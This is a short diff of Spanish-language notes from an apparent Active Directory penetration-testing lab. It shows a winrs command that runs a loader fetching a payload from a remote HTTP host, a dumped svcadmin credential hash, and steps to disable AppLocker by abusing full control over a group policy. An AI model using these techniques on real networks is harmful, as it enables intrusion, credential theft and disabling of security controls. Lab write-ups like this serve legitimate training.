@@ -710,4 +710,12 @@ winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.97:8080/S
 Obtenemos las credenciales de *svcadmin ->  6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011*
 
 Ahora deshabilitaremos el *AppLocker* en *dcorp-adminsrv* modificando la GPO
-Recordamos que nuestro usuario *studen97*
+Recordamos que nuestro usuario *studen97* tiene *Full Control/Generic All* sobre la politica de grupo de *AppLocker*, desactivaremos este *AppLocker* en *dcorp-adminsrv*
+
+Necesitaremos iniciar una consolapara la gestion de politicas de grupos deberemos descargala de la siguiente forma *Open Server Manager -> Add Roles and Features -> Next -> Features -> Check Group Policy Management -> Next -> Install*
+
+Una vez instalada deberemos iniciar *gpmc* ejecutando una shell en un nuevo proceso con una shell de privilegios elevados.
+```shell
+[student97]
+
+```
